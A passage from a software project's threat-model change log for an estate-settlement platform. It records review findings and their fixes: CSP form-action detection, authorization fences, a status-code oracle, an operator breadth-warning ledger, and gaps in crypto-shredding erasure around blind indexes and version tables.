  profile lacks is a service-LOCAL one; and it said vault's "`vault` admission"
  is unmeasured, which names the wrong audience, since `vault` is service-wide
  there and a route-level `vault` grant is refused by the shared fence outright.
  A fence whose input is narrower than its claim, twice, which is M45.
- **[ACCEPTED]** *`CallerGuard`'s reflector is `@Optional()` and falls back to
  the service-wide list when it does not resolve.* **SPLIT FROM ONE BULLET BY
  M40 PR3** (§6ggg), and accepted rather than carried as fence debt, because the
  property the old bullet feared is not the property the code has. The fallback
  DE-ESCALATES: it unions and never narrows, so an unresolved reflector cannot
  widen admission — which is this repo's own "fail closed means de-escalate"
  rule, honoured. It is reproduced with a positive control in two suites rather
  than argued about, and profile's real container is proven to resolve it inside
  a blocking gate by the stack e2e. What made this look like debt was reading a
  DECORATOR's optionality as a behaviour, which is the error M40 PR2 recorded at
  §6fff — the same mistake, one milestone later, found by re-reading rather than
  by being caught.


## 6ee. Threat-model delta — M21 PR4b, review round 2 (2026-08-20)

A second pass over the lens scopes PR4's fan-out never reached. Four findings,
all confirmed by execution; two sit in code PR4 itself shipped, which is the
fifteenth consecutive milestone where the machinery a milestone introduced is
where its own review lands.

**A DETECTOR WHOSE PREMISE WAS A TIMING CLAIM WAS DEAD CODE.** Both
isolated-origin launchers (`OperatorLaunch`, `VaultLaunch`) hand authority across
a trust boundary by a top-level form POST, and `form-action` is baked into the
app's CSP at BUILD time while the BFF serves the destination origin at REQUEST
time. PR4 added a `securitypolicyviolation` listener so a refused submit could
not fail silently, and asserted in the code that the event "fires synchronously
on the blocked submit". It does not. The listener was removed in a `finally` and
the flag read a task before the event could set it, so the refusal branch could
never execute. Measured in Chrome against `form-action 'none'`: the submit is
refused, the event does arrive, and the synchronous read is `false` in the
blocked and the allowed case alike — a signal carrying no information. The
listener now OUTLIVES the submit and reports when the violation lands; the two
ways it stops listening (re-arm, unmount) are the only reason that is safe and
both are asserted. What was never at risk is the credential: the field is cleared
unconditionally in the `finally`, so this was a silent-failure defect and not an
exposure.

**ONE UNKNOWN AUDIENCE BLANKED THE PAGE A USER OPENS TO REVOKE A CREDENTIAL.**
`Query.session` is deliberately tolerant of an audience it does not recognise;
`Query.sessions` was strict, and a `z.array` of strict objects fails WHOLESALE —
so a single row minted by an identity deployed ahead of the BFF discarded every
other row, `parseBody` threw, and the paired-devices page rendered an error
instead of the credentials the user came to revoke. `lib/sessions.ts` had carried
the fallback copy for exactly this case since M16, citing the rule that a service
deployed ahead of the app must not blank the page — and it was unreachable,
because the edge refused one layer up. The row is now carried as an opaque string
and named `UNKNOWN` on the wire. Deliberately NOT coerced to `ACCOUNT`: telling
somebody that a credential they do not recognise is their own browser is worse
than the error page it replaces, because it argues them out of revoking it.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** *The blocked-submit report is best-effort.* It reports a
  `form-action` refusal the browser chose to tell us about, and browsers are not
  obliged to. The guarantee on that path is the unconditional clear of the code
  field, not the message — which is why the clear is not conditional on the
  detector and never should become so.
- **[ACCEPTED]** *`UNKNOWN` describes two different situations to a reader.* An
  audience identity minted that this BFF does not know, and — through
  `audienceCopy`'s own fallback — one this app does not know because the BFF is
  ahead of it. Two skew directions, two mechanisms, one sentence on screen. The
  user's action is the same in both (revoke it), so distinguishing them would
  cost a reader something and buy nothing.
- **[ACCEPTED]** *No test anywhere exercises a real CSP refusal.* jsdom
  implements neither CSP enforcement nor `SecurityPolicyViolationEvent`, so the
  suite models the browser's half with a double, and the double's TIMING is the
  thing that was wrong for a whole PR. **ACCEPTED BY M40 PR3** (§6ggg): this is
  a property of the RUNNER, not a decision anyone deferred, and the residual risk
  is bounded one bullet away — the refusal is handled unconditionally by clearing
  the code, the detector is best-effort by design (§6ee, `[ACCEPTED]`), and the
  browser half HAS been measured in Chrome by hand, with the result recorded in
  both launchers. **AND THE OLD REMEDY SENTENCE WAS WRONG, WHICH IS THE REPAIR
  THIS BULLET NEEDED**: it said closing this "wants the launchers exercised in
  the existing headless-Chrome harness", and that harness has no page target, no
  app build and not one CDP page call — it cannot do this. Worse, it lives behind
  a paths filter that excludes `apps/web/**`, so the remedy as written would have
  produced a test that never runs on the code it guards. **A REMEDY NAMING A
  MECHANISM NOBODY CHECKED IS A DEFERRAL THAT CANNOT BE DISCHARGED** — the same
  shape as a remedy written as a PR number, which §6z already records.
- **[OWNER: M47]** *The `form-action` origin split is still unenforced outside
  the compose stack.* The detector reports the mismatch; nothing prevents it. A
  deployment can still serve an operator origin the built CSP does not permit,
  and a credential is left in the DOM on the failing path. **RE-OWNED FROM M23 BY
  M40 PR3** (§6ggg) to M47, a row this PR opens, because no existing owner fits:
  M45 is source-scanning fences (there is no scan here), M46 is the operator
  authorization model (the VAULT launcher has the identical shape, so tagging
  only the operator half would recreate the one-category-two-owners defect M40
  PR1 closed), and **E1 would be wrong on the merits** — E1 is the AWS half,
  blocked on money, and this needs no AWS anything. **TWO FACTS THE OLD SENTENCE
  OMITTED**: `images.yml` checks build-arg PROPAGATION rather than PARITY between
  the built CSP and the request-time value, so the reason this is not routine is
  weaker than the bullet claimed; and the default origin literal exists in two
  independent copies. Four mechanisms touch these origins and none enforces
  parity. The preventive half is an `apps/web` slice available today — bake the
  permitted origin into the client and refuse BEFORE the code reaches the DOM —
  and the agreement half needs deployment manifests that `infra/` does not yet
  hold.


## 6ff. Threat-model delta — M21 PR4c, the fences themselves (2026-08-20)

Round 3 re-ran the four lens scopes that had died of context exhaustion during
PR4, after #123 cut the auto-loaded `CLAUDE.md` from 641 KB to 11 KB. All four
completed and returned twelve findings — **none of them a product defect.** Every
runtime control they examined is correct. What was wrong was the proof: nine of
the twelve went green over the exact construct they were written to catch.

Four repeated mistakes, not twelve unrelated ones. Four fences were anchored on a
name a caller chooses rather than on what the runtime reads; three parsers were
narrower than their claim and skipped silently; two anti-vacuity floors sat at
the wrong LEVEL, asserting a total where the loss happens per-region; three
sentences had stopped being true. The first and third are rules this repository
already states — and had applied to its services, not to its fences.

The sharpest was the audience fence. `CallerGuard` resolves the string
`'estate:session-audiences'`; the fence grepped for the IDENTIFIER
`SESSION_AUDIENCE_METADATA`, so `@SetMetadata('estate:session-audiences',
['operator'])` widened any handler in six services and matched nothing — while
the docstring two lines above claimed that evasion was impossible. It is keyed on
the VALUE now, read from the exported constant at run time.

Two findings turned out to understate their own scope once the fix was attempted,
which is the reason this delta exists rather than a line in the decision log. The
naive comment stripper is in **24 places across 13 packages**, not the one the
lens named. And the "complete" nine-verb route list the review told us to copy is
itself short: Nest 11 ships **sixteen** route decorators, so both fences were
under-collecting and one of them had been declared correct.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** Twenty-one hand-rolled comment strippers remain outside
  `packages/auth-guard`, each `source.replace(/\/\*[\s\S]*?\*\//g, '')` or a
  near-variant, and each blind to a `/*` inside a string, template or regex
  literal. Three were replaced here with a real TypeScript parse; the rest were
  left deliberately rather than touching thirteen packages in a fence-repair
  change. The residual is that any fence reading source through one of them can
  be blinded by a string. Accepted because the blast radius of the sweep exceeds
  the risk of the gap, and because each remaining site is an absence check over a
  small corpus rather than a reconciliation.
- **[ACCEPTED]** `compose-parity` now REFUSES an environment line it cannot
  classify rather than skipping it, which closes the merge-key hole without a
  YAML dependency. It is still not a YAML parse: a construct compose accepts and
  this reader does not will stop the fence rather than mislead it. Failing loudly
  is the accepted trade; `js-yaml` is not a dependency of this repo and adding
  one to a test was not worth it.
- **[CLOSED: §6gg]** *`setDistributionStatus` refused in three distinguishable
  ways.* **CLOSED by M21 PR4d** — see §6gg. It was filed here as owned by M23 on
  the reasoning that it was latent until the executor UI arrived; closing it
  immediately was the cheaper call, because the fix is a refusal shape and no
  consumer exists to break.
- **[CLOSED: §6hh]** *The `granted_by IS NULL` forensic marker was stated
  backwards.* **CLOSED by M21 PR4e** — see §6hh. Corrected in the catalog by
  migration 005 rather than by editing the checksummed 001.

## 6gg. Threat-model delta — M21 PR4d, the distribution-status oracle (2026-08-20)

The one runtime finding from round 3, closed a day after it was recorded rather
than deferred to M23. `setDistributionStatus` was the only operator-reachable
write verb that looked its row up before consulting the gate, and it refused in
three distinguishable ways: `404` for an unknown id, `409 case_not_verified` for
a case that exists but is not administrable, and `403` for a real administrable
case the caller had no authority over. Holding a distribution UUID was therefore
enough to follow an estate's settlement progress after losing authority over it.
The concrete holder is a replaced or former executor; the id is a v4 UUID, so
this was never blind enumeration.

**The lookup could not move, so the refusals did.** The executor arm of the
authority test needs the case to know whose estate it is — unlike
`approveDistribution` twenty lines above, which is operator-only and can gate
first. Every refusal a caller without authority can reach is now the same `404`
an unknown id gets, which is the rule `assertCaseVisible` already states in that
file. `assertCaseVisible` itself was deliberately NOT reused: it admits the
decedent and the reporter, and neither of them may move money.

**Fail closed means DE-ESCALATE.** An executor with authority over the case is
still told `case_not_verified` when it is closed, because their remedy differs
from "this id does not exist". Two tests hold the pair apart and each is
load-bearing in the opposite direction: reverting the fix turns the uniformity
test red, and answering `404` to everybody turns the de-escalation test red.

Worth recording that the whole suite passed unchanged when the fix went in — no
test had ever exercised a refusal path on this verb, which is why the oracle
survived two reviews.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The uniformity is proven at the SERVICE layer against in-memory
  repositories, not on the wire. It reaches the wire because
  `HttpErrorFilter` passes `getStatus()` and the `error` token through unchanged
  — read, not measured. There is no live probe because no edge forwards this
  route: the BFF proxies no settlement admin route and operator-web's allowlist
  carries `/approval`, not `/status`. When M23 wires it, the e2e that ships with
  the UI is where the wire property gets asserted.
- **[ACCEPTED]** The `granted_by IS NULL` marker recorded in §6ff stays open and
  is not restated here. One residual, one place: a second copy is the thing that
  drifts, and the §6 count is derived from these bullets.

## 6hh. Threat-model delta — M21 PR4e, the marker in the catalog (2026-08-20)

The last item from round 3. `001_settlement_schema.sql` declares
`granted_by UUID, -- NULL: granted via the ops CLI`, and that has been false
since M21 PR1 made `--by` mandatory: the ceremony always writes the column now,
so a NULL marks a row that did **not** come through it — the exact inversion of
what the schema says. It is the signal `operator-cli.ts` §2 and two specs rely
on, and the schema told an investigator the reverse.

**Where the correction lives is the point.** Migrations are append-only and
checksummed, so 001 could not be edited — but a `--` comment in an old migration
was the wrong home anyway. Nobody reading `\d+ settlement_operators` during an
incident is also reading migration 001. Migration 005 sets a `COMMENT ON COLUMN`
(and one on the table), so the truth is in the catalog where `\d+` and
`col_description()` both show it, following the identity 004 precedent.

**And it is now a fence, not a sentence.** `operator-cli.int.spec.ts` asserts the
catalog comment against real Postgres, keyed on the DIRECTION rather than the
column name: a comment that merely mentioned `granted_by` would satisfy a
presence check and still be backwards. Two mutations confirm it — deleting the
`COMMENT ON` and restoring 001's original wording each turn it red, with eight
tests passing as the control.

`docs/02` gained a POINTER rather than a copy: it names where the meaning lives
instead of restating it, because a second copy is the one that drifts and this
particular reading has already inverted once.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The wrong sentence still sits in `001_settlement_schema.sql` and
  always will — the file is checksummed and immutable. A reader of that file
  alone still reads the inversion. Accepted because the alternative is editing an
  applied migration, which raises `MigrationDriftError` and blocks the next one;
  the catalog is the surface an investigator actually queries, and it is now
  right and asserted.
- **[ACCEPTED]** `--by` remains attribution, not authentication: whoever runs the
  CLI holds the database connection and could write the row by hand. Unchanged by
  this delta and stated again because the corrected comment says so — a NULL is a
  row to investigate, not proof of anything on its own.

## 7. Validation program

- **Continuous:** SAST/DAST/dependency scanning in CI; fuzzing on parsers (document ingest, OCR, webhook handlers); secrets scanning; IaC policy checks (tfsec/OPA).
- **Quarterly:** External penetration test rotating focus (auth → vault → settlement → APIs); purple-team exercise against one §5 scenario.
- **Annually:** Full red team including social engineering of the settlement flow; SOC 2 Type II audit; DR failover game day; threat-model refresh.
- **Always-on:** Public bug bounty with elevated payouts for Zone A and settlement-flow findings.

## 6ii. Threat-model delta — M22 PR1, the operator breadth bound (2026-08-20)

**The gap.** Three reviews in a row observed the same shape and none closed it:
an operator on the allowlist may approve reviews, confirm verifications, approve
stages and approve distributions across an unbounded number of estates, and
nothing anywhere counted. Every individual action was authorised, audited and
dual-controlled; the AGGREGATE was invisible. The abuse this leaves open is not
one bad decision — it is a compromised or coerced operator session working
steadily across hundreds of families, where each step looks exactly like the job.

**What ships.** `settlement_operator_actions` (migration 006) is an append-only
ledger of PERMISSIVE operator actions. `OperatorActionsRepo.distinctCasesSince`
answers how many DISTINCT estates one operator has touched in a rolling window,
and crossing the ceiling emits `settlement.operator.breadth_exceeded`.

**BREADTH, not volume — and the distinction is the control.** Thirty actions on
one estate is a thorough operator; one action on each of thirty estates in an
hour is a pattern. A rate limit on actions would have penalised the first and
missed the second. The counter is `COUNT(DISTINCT case_id)`, and a mutation to
`COUNT(*)` turns a named integration assertion red.

**It WARNS. It does not refuse.** This is a deliberate deviation from how the
platform usually treats a ceiling, and the reason is that settlement's human
review is *mandatory* and time-sensitive: an operator blocked mid-ceremony
leaves a family's estate frozen and a death case stalled, and the ceiling has no
production data behind it — 12 estates per hour is a guess. Refusing on a guess
would make the control an outage with the face of a security measure, which is
the failure mode docs/03 names elsewhere. So the first slice makes the pattern
VISIBLE and reviewable, and a refusal (or a step-up re-challenge, the better
shape) is a decision for after the numbers exist. A test asserts the action
succeeds when the warning fires; mutating the warn into a `throw` turns it red.

**PROTECTIVE actions are never counted.** Denying a review, denying a stage and
revoking a stage write nothing to the ledger, and the two action sets are
asserted disjoint. The design rule this serves is the one the whole bound is
subordinate to: *the protective action must never be harder than the permissive
one.* An operator who is close to the ceiling must never hesitate to withdraw
access. Counting a revocation would put a budget on saying no.

**Coverage is derived, not listed.** `operator-breadth-fence.spec.ts` reads the
AST of both settlement services, takes every method that calls
`this.gate.assertIn` as its corpus, and fails on any that neither records nor
carries a written exemption — in both directions, so an exemption outliving its
method also fails. It caught its own first defect: `review.approved` and
`verification.confirmed` were declared members of the permissive vocabulary and
nothing wrote either. Two of six kinds were dead on arrival, and a count-based
check would not have shown it.

**Deploy order.** `settlement.operator.breadth_exceeded` is a new `AUDIT_ACTIONS`
member, so the audit consumer ships before the settlement service or the events
are dropped as `schema_violation` and this control's only visible surface goes
silent.

**Residuals, stated rather than implied.**

- **[CLOSED: §6jj]** *`reportProviderSignal` was in the category and was not
  counted.* Closed by M22 PR2: the ledger write was threaded into `insertCase`'s
  own transaction, which is what this bullet said the correct fix would be.
- **[ACCEPTED]** The ceiling (12) and the window (1h) are engineering guesses
  with no production data behind them. They are constants in one file, asserted
  at both boundary arms, so re-tuning is a one-line change with a test that
  moves with it — but until the platform runs, the right value is unknown.
- **[ACCEPTED]** The ledger is per-service. An operator's breadth across OTHER
  services (documents, assets) is not aggregated here; only settlement's own
  ceremonies are counted. A cross-service view belongs to the audit pipeline,
  which already receives every one of these events.

## 6jj. Threat-model delta — M22 PR2, intake counted (2026-08-20)

The one gap §6ii declared open. An operator opening death cases on a data
provider's behalf is the purest form of the pattern the breadth bound models —
it needs no prior relationship to the estate, and it is the only permissive verb
that CREATES the estate it counts against — and it was the one permissive verb
not counted.

**Why it was left open, and why that reason is now gone.** `reportProviderSignal`
owns no transaction: `insertCase` opens its own, and it is shared with the
non-operator trusted-contact path. A ledger row written after that commit can be
lost while the case stands, which UNDER-counts — the fail-open direction, and not
a thing to ship quietly. The fix is the one the exemption named: `insertCase`
takes the attribution and records inside its own transaction, returning the count
so the caller emits after the commit. The row and the case it describes now
commit together, which is the invariant every other counted verb already had.

**The field is `countBreadthFor`, and it is NOT derived from `reportedBy`.** That
derivation is the obvious simplification, it type-checks perfectly, and it is
wrong on exactly one input: an operator who is ALSO a linked contact reporting
through the contact path. Their authority there is the contact link, not the
allowlist — the same reasoning that makes the owner's `void` pass a literal
`false` rather than measuring the allowlist — so they must not be charged for it.
The test that decides this exercises the arm where the two facts DISAGREE, and
mutating the field to `actor` turns it red.

**The fence follows the delegation now.** Because the record happens one hop away
in `insertCase`, a fence reading only a method's own text would have called the
one verb whose ledger write is transactionally correct an orphan. It resolves
`this.<method>(` edges out of the AST and computes reachability transitively, so
inserting another hop cannot silently drop a verb out of coverage. That resolver
is itself pinned: making it answer `true` for everything turns a named assertion
red, because the read-only gated verbs must still come back uncounted.

Four mutations red by a named assertion, with a no-op edit green as the control.
The first attempt at the `countBreadthFor: actor` mutation SURVIVED, and the
diagnosis is worth recording: it inserted a duplicate object key rather than
replacing the existing one, and the last key wins in JavaScript, so the mutant
was byte-different and behaviourally identical. Unfaithful mutation, not a weak
test — retargeted at the real line, it went red.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The coverage fence proves a gated verb REACHES the ledger, not
  that the reached call sits on a path the verb actually takes. Following
  delegation made it able to see the intake verb at all; it did not make it a
  path analysis, and a helper that records inside a branch the caller never
  enters would still read as covered. The ARMS are proved by execution instead —
  `settlement.service.spec.ts` and `admin.service.spec.ts` assert which
  decisions record and which record nothing — so the fence's job is coverage and
  the tests' job is behaviour. Making the fence path-sensitive would be a real
  improvement and is not attempted here.
- **[ACCEPTED]** The window and ceiling caveats from §6ii stand unchanged and are
  not restated: one residual, one place.

## 6kk. Threat-model delta — M25 PR0, the erasure boundary (2026-08-21)

**The product can say "this was erased" and cannot erase anything.** M23 PR4b
gave the distribution amount route a `content_erased` arm at 410 — permanent,
never a retry — and the same spelling already sits in three `DocumentsService`
paths, in the BFF's error vocabulary, in the web client's closed code set and on
the operator console. Nothing produces it. `destroyDek`
(`packages/crypto/src/dek.ts`) has one definition and one caller, a test. This
delta records the boundary the milestone that fixes that must respect, before
any of it is built.

**FOUR ARTIFACTS ARE PRESENT AND UNREACHABLE**, which is why M25 is a wiring
milestone rather than a construction one: `destroyDek` itself; `users.status =
'closed'`, which is in the DDL CHECK and is READ as a login refusal
(`auth.service.ts`) while nothing writes it; `crypto.dek.destroyed`, which is in
`AUDIT_ACTIONS` with zero producers; and the `content_erased` arms above.
`markDestroyed` is implemented in all eight DEK-holding services. The storage
layer for erasure is finished and has never been called.

**THE PARTICIPANT SET IS DERIVED, TWICE, AND THE FENCE IS THIS PR'S ONLY CODE.**
An erasure must reach every domain holding key material for the user: eight
services across four clusters, derived from `apps/stack/src/topology.ts` as the
`SERVICES` entries with a non-null `kekAlias`, and independently from the
migrations as the services creating a table whose name ends in `deks`. The two
are compared as SETS. They are genuinely independent because the eight do not
agree on a table name — `deks` in three, `settlement_deks`, `document_deks`,
`notification_deks`, `plaid_deks` and `assistant_deks` in the others — so a
fence keyed on one spelling would have found three of eight and gone green.
`vault` and `audit` are excluded with their reasons asserted rather than
assumed: Zone A holds no server-side key material and its shred is
`POST /v1/vault/reset`, which already exists; audit holds entity ids and enums.

**WHAT THE QUEUE ANNOTATION MEANT, NOW MECHANISED.** docs/04 has said "must
precede any new encrypted data class" since the sequence was selected, with
nothing behind it. A ninth service arriving with a KEK and no DEK table now
turns the fence red, and so does one with a DEK table and no `markDestroyed`.
Both were proved by mutation.

**OWNER-INITIATED ONLY, STEP-UP GATED, NO PRIVILEGED ROLE** (decision
2026-08-21). The consequences are not all obvious and are recorded as residuals
below rather than discovered later — in particular that owner-initiated-only
means no path erases a decedent's estate, ever, and that the "privileged
retention job" docs/02 and `dek.ts` have both described since M1 does not exist
and is not being built.

**THE ERASURE ACT WOULD IMMORTALISE THE IDENTIFIER IT ERASES.** This is the
finding scoping produced, and it sets PR1 before PR3. `users.email_bidx` is an
HMAC under a service-wide blind-index key, not a `*_ct` + `dek_id` pair, so the
shred does not reach it. Migration 008's own justification says `password_hash`
is "the ONE column in `users` for which that is false" — there are two. And
`users_capture_version()` is `to_jsonb(OLD) - 'password_hash'`, so every `users`
UPDATE writes a full row image into `users_versions`, which carries
`REVOKE UPDATE, DELETE`. Erasure must UPDATE `users` to set `status = 'closed'`.
Nulling the live column does not help: the trigger captures `OLD`. That is
migration 008's argument verbatim, with its ordering constraint intact —
`CREATE OR REPLACE FUNCTION` affects only future captures, so the redaction
ships in or before the first `destroyDek` caller or no later migration can
retract what erasure wrote. **Migration 008 is not edited**: it is applied and
checksummed, and editing it raises `MigrationDriftError`. The correction lives
here and in PR1's new migration.

### Residuals

- **[CLOSED: §6nn]** *The shred does not reach `users.email_bidx`, live or
  captured.* PR1 closed the capture half; PR3 closed the live half by
  overwriting the column with a real blind index of an address nobody holds.
  The original text follows.
  * Given the blind-index key and a candidate address, an erased
  account can still be confirmed to have existed, and every historical value
  sits in an INSERT-only version table. PR1 redacts it from the `users` capture;
  the live column is `NOT NULL` and unique-where-not-deleted, so whether erasure
  overwrites it with random bytes or the column becomes nullable is PR1's to
  decide and to state. The threat model is an insider with the blind-index key
  and direct cluster read, not an external attacker — this is erasure
  COMPLETENESS, not a confidentiality break, and it should not be read as the
  latter.
- **[OWNER: M26]** *`document_versions.content_sha256` is a hash of the
  PLAINTEXT, in an append-only table, and the shred does not reach it either.*
  Same class as the blind index: it lets a held candidate document be confirmed
  against an erased estate. Not fixed here because the column is the
  disaster-recovery integrity check (decrypt-then-hash) and removing it costs
  something real; PR1 answers it either way rather than leaving it unstated.
  **PR1 DID NOT ANSWER IT, and PR4 is recording that rather than letting the
  sentence stand.** PR1's category was blind indexes in tables identity, profile
  and plaid own; this column is in the documents cluster, which M25 never
  reaches. RE-OWNED TO M26 with the rest of the fan-out.
- **[ACCEPTED]** *There is no privileged database role, and M25 is not building
  one.* docs/02 and `packages/crypto/src/dek.ts` have both described "a
  privileged retention job (not the app role)" since M1; no `CREATE ROLE` or
  `GRANT` exists outside test files. Both sentences are corrected in this PR.
  What replaces the boundary is the declared caller allowlist in
  `packages/contracts/test/erasure-domains.spec.ts`, and the asymmetry is the
  point: a role stops a compromised app process from destroying keys at
  RUNTIME, the allowlist stops a second caller arriving in REVIEW. The runtime
  direction is uncovered. Accepted because the decision was taken deliberately
  rather than missed, and because a role nobody has costed is exactly the shape
  of deferral §6 exists to make visible — a later milestone may add one, and
  none is owed.
- **[ACCEPTED]** *No path erases a decedent's estate.* Owner-initiated-only
  means the requester must be alive and signed in, and an account at
  `settlement` cannot request anything, so a decedent's PII is retained
  indefinitely by design. Coherent — an executor erasing the estate they
  administer is not a capability to add casually — but it is a choice, and it is
  recorded here so it is not mistaken for an oversight when someone asks why
  erasure has no estate path.

## 6ll. Threat-model delta — M25 PR1, the capture stops keeping blind indexes (2026-08-21)

**PR0 recorded one column and the category has three.** §6kk named
`users.email_bidx` — the one the erasure path walked into. Deriving the same
question from the schema instead of remembering it found THREE tables carrying
both a `*_bidx` and a `<table>_versions` shadow that captures it, in three
different services: `users` (identity), `contacts` (profile) and `plaid_items`
(plaid). A rule applied to one member of a category is a rule half-applied, and
this is the second time in two PRs that deriving a set found it bigger than the
sentence describing it.

**AND THE MEMBER PR0 MISSED IS THE SHARPER ONE.** `users.email_bidx` indexes the
account holder's own address. `contacts.email_bidx` indexes a LIVING THIRD
PARTY's — the attorney, the beneficiary, the family member the owner named.
Erasing an account should not leave a searchable index of the people that
account knew, and those people never had a say in the account existing. The
severity ordering is the reverse of the discovery ordering, which is the argument
for deriving categories rather than fixing the instance in front of you.

**THE REDACTION IS DERIVED FROM THE ROW.** Each capture function drops every key
in its own image ending in `_bidx`, rather than naming a column. A capture that
named `email_bidx` literally would pass a test and leave the NEXT blind index on
that table captured; the fence asserts the mechanism reads
`jsonb_object_keys(image)` and REFUSES a hand-named key, so the weaker fix
cannot land looking like the stronger one.

**TWO HALVES, AND NEITHER IS THE WHOLE.** The static fence
(`packages/contracts/test/version-capture-redaction.spec.ts`) reads the
migrations and proves a redaction was WRITTEN — it cannot see whether it was
applied. `blindIndexCaptureGaps` in `@estate/db` asks the RUNNING DATABASE what
function it is executing, via `pg_get_functiondef`, derived from
`information_schema`; identity, profile and plaid each call it on their own
migrated schema. The end-to-end proof is identity's `password-change.int.spec.ts`,
which drives a real service UPDATE and reads the captured image back — asserting
the key is gone, that no key ending in `_bidx` survives under any name, and that
the seeded index VALUE does not appear anywhere in the serialized image.

**THE POSITIVE CONTROL IS `document_search_tokens`**, and it is what makes the
shadow predicate a predicate. It carries `token_bidx` — per-user HMACs of
document CONTENT, the most sensitive blind index in the repo — and deliberately
has no version shadow, being a rebuildable projection. It must be SEEN by the
column scan and EXCLUDED by the shadow test. A predicate matching everything
sweeps it in; one matching nothing empties the category and passes.

**A THIRD COMMENT DESCRIBED THE RETENTION JOB.** PR0 corrected docs/02
§conventions and `packages/crypto/src/dek.ts` and said there were two. There were
three: `documents.service.ts`'s `softDelete` docstring said "the retention job
owns crypto-shredding". Corrected here. A fourth sits in
`documents/migrations/002_document_vault.sql`, which is applied and checksummed
and cannot be edited — recorded below rather than left to be rediscovered.

### Residuals

- **[ACCEPTED]** *`document_versions.content_sha256` stays, and the shred does
  not reach it.* It is a hash of the PLAINTEXT in an append-only table, so it
  lets someone holding a candidate document confirm an erased estate once held
  those exact bytes. Kept for three reasons: it is the disaster-recovery
  integrity check (decrypt-then-hash, rebuild-and-diff), `document_versions` is
  append-only by design so the no-hard-deletes rule forbids removing the rows,
  and the attack needs the exact plaintext — a far smaller class than an email
  HMAC, where the candidate space is guessable. What would change this answer is
  a rebuild check that does not need a plaintext hash; until one exists the cost
  of removing it is a real capability for a marginal gain.
- **[OWNER: M26]** *`document_search_tokens` is not purged by anything.* Its
  `token_bidx` rows are HMACs derived from document content — the DEK
  destruction erases the content and leaves the tokens, which is the same defect
  class as the blind indexes this PR closed and is NOT closed by it. The table's
  own comment says legal erasure "purges a document's rows via the privileged
  retention job", which is the fourth description of a job that does not exist
  and sits in an applied, checksummed migration that cannot be corrected in
  place. PR3 owns the purge. **PR3 DID NOT DO IT and could not: documents is
  one of the seven domains with no erasure transport, so RE-OWNED TO M26**
  (docs/03 §6nn). Recorded here as well as there, because this is the sentence
  a reader checking "was the blind-index category finished" will land on.
- **[OWNER: M26]** *What the LIVE blind-index column holds after an erasure is
  undecided, and that category is WIDER than this PR's.* **PR3 ANSWERED IT FOR
  `users.email_bidx` ONLY** — a real blind index of `<uuid>@erased.invalid`, so
  the width, key and purpose label cannot drift and the value cannot collide.
  `contacts.email_bidx` and `plaid_items` are untouched and belong to the
  domains M25 does not reach. **`email_changes.new_email_bidx` DID NOT, AND
  THAT SENTENCE WAS WRONG — CORRECTED BY PR5 (§6pp), WHICH CLOSES IT.** The
  three were grouped by column name; `email_changes` is identity's own table,
  in identity's own cluster, reachable by the leg PR3 already shipped. Grouping
  a category by what its members are CALLED rather than by who OWNS them is how
  a live gap left a residual sweep reading as complete. The original text
  follows.
  * This PR stops the
  CAPTURE; it does not say what erasure writes to `users.email_bidx`, which is
  `NOT NULL` with a unique index partial on `deleted_at IS NULL`.
  `contacts.email_bidx` is already nullable with a matching partial index, so
  the two do not need the same answer — and PR3 must state which it takes rather
  than letting the column types decide for it. **`email_changes.new_email_bidx`
  belongs to this question too and to no fence here**: it is `NOT NULL` in a
  table carrying `REVOKE DELETE`, so its rows persist without being a version
  shadow at all. The capture category and the live-column category are not the
  same set, and reading a green run of the PR1 fences as covering both is the
  mistake this bullet exists to prevent.
- **[ACCEPTED]** *`versionsTableSql` is a template with no runtime caller.* Its
  output was copied into `.sql` files once and the migrations are the deployed
  truth, so updating the helper fixes nothing already deployed — the three
  migrations do that. It is updated anyway so the next table copied from it is
  born correct, and the fences read the MIGRATIONS rather than the helper for
  exactly this reason. Recorded because "the helper is fixed" is the tempting
  and wrong summary of this change.

## 6mm. Threat-model delta — M25 PR2, the erasure decision record (2026-08-21)

**AN OWNER CAN NOW ASK TO BE ERASED, AND NOTHING CAN ERASE THEM.** That is the
deliberate shape of this PR. `destroyDek` still has no production caller; the
fan-out across the eight DEK domains and the destroy leg are PR3. What ships is
the record that decides whether the irreversible half ever runs — the M21 PR3a
precedent, where a boundary reviewed better alone than bolted to the screens it
would carry.

**THE ALLOWLIST RIDES INSIDE THE STATEMENT.** `insertIfPermitted` is an
`INSERT ... SELECT ... WHERE EXISTS` naming the permitted statuses, not a read
above a write. A pre-transaction check and the write it guards are separated by
every commit that lands between them, and what this record arms is the most
irreversible process in the product. The suite proves the property rather than
the shape: it moves the account's status and watches the identical call refuse,
with no pre-check for a commit to race.

**DENY BY DEFAULT, AND ONLY ONE REFUSAL IS REACHABLE.**
`ERASURE_PERMITTED_STATUSES` is `['active']`. The other five statuses in the
`users` CHECK are refused, and four of them cannot reach the code at all:
`SessionsRepo.findLiveByAccessHash` resolves a session only while the account is
`active` or `deceased_pending`, so a caller with a live session is necessarily
one of those two. Knowing WHICH refusal a real person hits is what makes the
copy decidable, and the allowlist still refuses the unreachable four because
deny-by-default costs nothing and the reachable set is not a constant.

**TWO REFUSALS, TWO TOKENS.** `open_death_report` for a living owner reported
dead — a control firing, with a remedy that is theirs to take: sign in, void the
case, come back. `erasure_not_permitted` for everything else. Collapsing them
would tell somebody whose account is being taken from them that the product is
broken, which is the failure the "a control firing must not read as an outage"
rule names.

**THE PROTECTIVE VERB IS THE UNGATED ONE, and the asymmetry inverts the usual
shape.** Normally the permissive action is step-up gated and the protective one
is free (grant vs revoke). Here the permissive action IS the destructive one, so
`POST` carries `StepUpGuard` and `DELETE` does not. An owner who armed this by
accident — or whose session was briefly taken — must be able to disarm it with
nothing but the session they already hold. The cancel also carries NO status
allowlist: an account that became ineligible to REQUEST erasure while a request
was live must still be able to withdraw it, or a control meant to protect the
owner strands the most dangerous record in the system in its armed state. That
is "fail closed means DE-ESCALATE, not refuse everything", and it is the
assertion a mutation reddens on its own.

**AUDIT ONLY, NO DOMAIN EVENT.** `auth.account.erasure_requested` and
`auth.account.erasure_cancelled` join the closed catalog; nothing is published
to a topic, because nothing consumes one and PR3 will choose its own transport
with its own consumers. **THE AUDIT CONSUMER MUST DEPLOY BEFORE IDENTITY DOES**,
and PR4 watched exactly that go wrong on the local stack: identity was rebuilt
without the audit service, and the first erasure request was rejected
